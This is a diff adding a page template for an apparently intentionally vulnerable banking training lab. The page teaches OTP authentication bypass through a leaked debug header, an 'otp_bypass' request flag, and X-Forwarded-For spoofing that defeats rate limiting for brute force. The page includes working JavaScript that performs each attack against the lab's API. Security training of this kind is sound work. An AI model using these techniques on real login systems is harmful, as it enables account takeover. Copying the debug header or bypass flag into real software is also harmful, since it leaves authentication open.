@@ -1,0 +1,244 @@
+{% extends "base.html" %}
+{% block title %}Lab 1 — OTP Bypass — NexBank{% endblock %}
+{% block content %}
+
+<div class="page-header">
+  <div class="page-header-inner">
+    <div class="page-breadcrumb"><a href="/">Labs</a> / <span style="color:#fff">Lab 1</span></div>
+    <h2>Lab 1 — OTP Authentication Bypass</h2>
+  </div>
+</div>
+
+<div class="page-content">
+
+  <div class="ato-objective">
+    <div class="obj-icon">🎯</div>
+    <div class="obj-text">
+      <strong>Objective:</strong> Login to <em>Priya Nair's</em> account (mobile: <code style="color:var(--primary)">9100000002</code>) without knowing her OTP — using three different bypass techniques.
+    </div>
+  </div>
+
+  <div class="ato-steps">
+
+    <!-- Method A: Header Leak -->
+    <div class="ato-step" id="step-a">
+      <div class="step-header">
+        <div class="step-num">A</div>
+        <div class="step-info">
+          <div class="step-title">Method A — OTP Leaked in Response Header</div>
+          <div class="step-vuln">Flaw: <code>X-Debug-OTP</code> header in <code>POST /api/auth/send-otp</code> response exposes the OTP</div>
+        </div>
+        <div class="step-status" id="sa-status">⬜</div>
+      </div>
+      <div class="step-body">
+        <p>The server sends the real OTP inside a debug response header. Visible in Burp Suite response or browser DevTools → Network tab.</p>
+        <div class="input-row">
+          <input type="tel" id="a-mobile" class="form-input" value="9100000002" placeholder="Target mobile">
+          <button class="btn btn-primary" onclick="aRequestOTP()">Send OTP</button>
+        </div>
+        <pre id="a-otp-result" class="result-box"></pre>
+        <div id="a-otp-box" style="display:none">
+          <div style="background:var(--debit-bg);border:1px solid #f5c2c0;border-radius:6px;padding:12px 16px;margin:10px 0;font-size:13px;color:var(--debit)">
+            🚨 <strong>OTP exposed in response header:</strong> &nbsp;
+            <code id="a-otp-val" style="font-size:15px;font-weight:800;color:var(--debit)"></code>
+          </div>
+          <div class="input-row">
+            <input type="text" id="a-otp-input" class="form-input" placeholder="OTP (auto-filled above)" maxlength="6">
+            <button class="btn btn-primary" onclick="aVerifyOTP()">Login with Leaked OTP</button>
+          </div>
+        </div>
+        <pre id="a-login-result" class="result-box" style="display:none"></pre>
+      </div>
+    </div>
+
+    <!-- Method B: Bypass Parameter -->
+    <div class="ato-step" id="step-b">
+      <div class="step-header">
+        <div class="step-num">B</div>
+        <div class="step-info">
+          <div class="step-title">Method B — OTP Bypass Parameter</div>
+          <div class="step-vuln">Flaw: <code>otp_bypass=true</code> in request body skips OTP validation entirely</div>
+        </div>
+        <div class="step-status" id="sb-status">⬜</div>
+      </div>
+      <div class="step-body">
+        <p>The <code>/api/auth/verify-otp</code> endpoint checks for <code>otp_bypass</code> before validating the OTP. Sending <code>"otp_bypass": true</code> immediately returns a verified session — no OTP needed.</p>
+
+        <div style="background:#f0f4f8;border:1px solid var(--border);border-radius:6px;padding:12px 14px;font-family:var(--mono);font-size:12.5px;margin-bottom:12px">
+<span style="color:#888">POST</span> /api/auth/verify-otp<br>
+{<br>
+&nbsp;&nbsp;<span style="color:var(--primary)">"mobile"</span>: <span style="color:var(--credit)">"9100000002"</span>,<br>
+&nbsp;&nbsp;<span style="color:var(--primary)">"otp_bypass"</span>: <span style="color:var(--debit)">true</span><br>
+}
+        </div>
+
+        <div class="input-row">
+          <input type="tel" id="b-mobile" class="form-input" value="9100000002" placeholder="Target mobile">
+          <button class="btn btn-primary" onclick="bBypass()">Bypass OTP</button>
+        </div>
+        <pre id="b-result" class="result-box"></pre>
+      </div>
+    </div>
+
+    <!-- Method C: Rate Limit Bypass -->
+    <div class="ato-step" id="step-c">
+      <div class="step-header">
+        <div class="step-num">C</div>
+        <div class="step-info">
+          <div class="step-title">Method C — Rate Limit Bypass via X-Forwarded-For</div>
+          <div class="step-vuln">Flaw: Rate limiting uses <code>X-Forwarded-For</code> header — attacker-controlled, allows unlimited OTP sends</div>
+        </div>
+        <div class="step-status" id="sc-status">⬜</div>
+      </div>
+      <div class="step-body">
+        <p>The server limits OTP requests to <strong>5 per IP per 60 seconds</strong> — but the IP is read from the <code>X-Forwarded-For</code> header which is attacker-controlled. Changing it each time bypasses the limit, allowing brute-force of a 6-digit OTP (1,000,000 combinations).</p>
+
+        <div style="background:#f0f4f8;border:1px solid var(--border);border-radius:6px;padding:12px 14px;font-family:var(--mono);font-size:12.5px;margin-bottom:12px">
+<span style="color:#888">POST</span> /api/auth/send-otp<br>
+<span style="color:var(--debit)">X-Forwarded-For: 10.0.0.<strong>[increment]</strong></span> ← spoof IP each time<br>
+{"mobile": "9100000002"}
+        </div>
+
+        <p style="font-size:12.5px;color:var(--text2)">Simulate: send OTP 10 times with rotating IPs — no rate limit hit.</p>
+        <div class="input-row">
+          <input type="tel" id="c-mobile" class="form-input" value="9100000002" placeholder="Target mobile">
+          <button class="btn btn-primary" onclick="cRateBypass()">Send 10× with Rotating IPs</button>
+        </div>
+        <pre id="c-result" class="result-box"></pre>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Completion -->
+  <div id="lab1-complete" class="ato-complete-box" style="display:none;margin-top:20px">
+    <div class="complete-icon">✅</div>
+    <h3>Lab 1 Complete</h3>
+    <p>You bypassed OTP authentication using <strong>3 different techniques</strong>:</p>
+    <ol>
+      <li><strong>Debug Header Leak</strong> — OTP returned in <code>X-Debug-OTP</code> response header</li>
+      <li><strong>Bypass Parameter</strong> — <code>otp_bypass=true</code> skips validation server-side</li>
+      <li><strong>Rate Limit Spoof</strong> — <code>X-Forwarded-For</code> is attacker-controlled, enables brute-force</li>
+    </ol>
+    <a href="/lab2" class="btn btn-primary">Next: Lab 2 — IDOR →</a>
+  </div>
+
+</div>
+{% endblock %}
+{% block scripts %}
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  if (!getToken()) {
+    document.querySelector('.ato-steps').insertAdjacentHTML('beforebegin',
+      '<div style="background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:14px 18px;margin-bottom:20px;font-size:13px;color:#856404">' +
+      '🔐 <strong>Login required.</strong> &nbsp;<a href="/login" style="color:#0044aa;font-weight:600">Login first →</a></div>'
+    );
+  }
+});
+
+var _done = {a:false, b:false, c:false};
+function checkComplete() {
+  if (_done.a && _done.b && _done.c) document.getElementById('lab1-complete').style.display = 'block';
+}
+function markDone(k) {
+  _done[k] = true;
+  document.getElementById('s'+k+'-status').textContent = '✅';
+  checkComplete();
+}
+
+/* ── Method A ── */
+function aRequestOTP() {
+  var mob = document.getElementById('a-mobile').value.trim();
+  fetch('/api/auth/send-otp', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({mobile: mob})
+  }).then(function(r) {
+    var otp = r.headers.get('X-Debug-OTP');
+    return r.json().then(function(d) { return {data:d, otp:otp}; });
+  }).then(function(res) {
+    document.getElementById('a-otp-result').textContent = JSON.stringify(res.data, null, 2);
+    if (res.otp) {
+      document.getElementById('a-otp-val').textContent   = res.otp;
+      document.getElementById('a-otp-input').value       = res.otp;
+      document.getElementById('a-otp-box').style.display = 'block';
+      showAlert('OTP found in X-Debug-OTP header: ' + res.otp, 'error');
+    } else {
+      showAlert(res.data.error || 'No OTP in header', 'error');
+    }
+  });
+}
+
+function aVerifyOTP() {
+  var mob = document.getElementById('a-mobile').value.trim();
+  var otp = document.getElementById('a-otp-input').value.trim();
+  fetch('/api/auth/verify-otp', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({mobile: mob, otp: otp})
+  }).then(function(r){return r.json();}).then(function(d){
+    if (!d.user_id) { showAlert(d.error||'Failed','error'); return; }
+    return fetch('/api/auth/login', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({otp_verified:true, user_id:d.user_id})
+    }).then(function(r){return r.json();}).then(function(login){
+      var el = document.getElementById('a-login-result');
+      el.style.display = 'block';
+      el.textContent   = JSON.stringify(login, null, 2);
+      if (login.token) {
+        showAlert('Logged in as ' + (login.user&&login.user.name) + ' via header leak!', 'success');
+        markDone('a');
+      }
+    });
+  });
+}
+
+/* ── Method B ── */
+function bBypass() {
+  var mob = document.getElementById('b-mobile').value.trim();
+  fetch('/api/auth/verify-otp', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({mobile: mob, otp_bypass: true})
+  }).then(function(r){return r.json();}).then(function(d){
+    if (!d.user_id) { document.getElementById('b-result').textContent = JSON.stringify(d,null,2); return; }
+    fetch('/api/auth/login', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({otp_verified:true, user_id:d.user_id})
+    }).then(function(r){return r.json();}).then(function(login){
+      document.getElementById('b-result').textContent = JSON.stringify(login, null, 2);
+      if (login.token) {
+        showAlert('Bypassed! Logged in as ' + (login.user&&login.user.name), 'success');
+        markDone('b');
+      }
+    });
+  });
+}
+
+/* ── Method C ── */
+function cRateBypass() {
+  var mob = document.getElementById('c-mobile').value.trim();
+  var el  = document.getElementById('c-result');
+  el.textContent = 'Sending 10 OTP requests with rotating X-Forwarded-For IPs...\n';
+  var promises = [];
+  for (var i = 1; i <= 10; i++) {
+    (function(n) {
+      promises.push(
+        fetch('/api/auth/send-otp', {
+          method:'POST',
+          headers:{'Content-Type':'application/json','X-Forwarded-For':'10.0.0.'+n},
+          body: JSON.stringify({mobile: mob})
+        }).then(function(r){
+          var otp = r.headers.get('X-Debug-OTP');
+          return r.json().then(function(d){ return {n:n, status:r.status, otp:otp, msg:d.message||d.error}; });
+        })
+      );
+    })(i);
+  }
+  Promise.all(promises).then(function(results){
+    el.textContent = results.map(function(r){
+      return 'Request '+r.n+' (IP 10.0.0.'+r.n+'): HTTP '+r.status+' — '+r.msg + (r.otp ? ' [OTP: '+r.otp+']' : '');
+    }).join('\n');
+    showAlert('10 OTP requests sent — no rate limit hit (different IPs)', 'success');
+    markDone('c');
+  });
+}
+</script>
+{% endblock %}
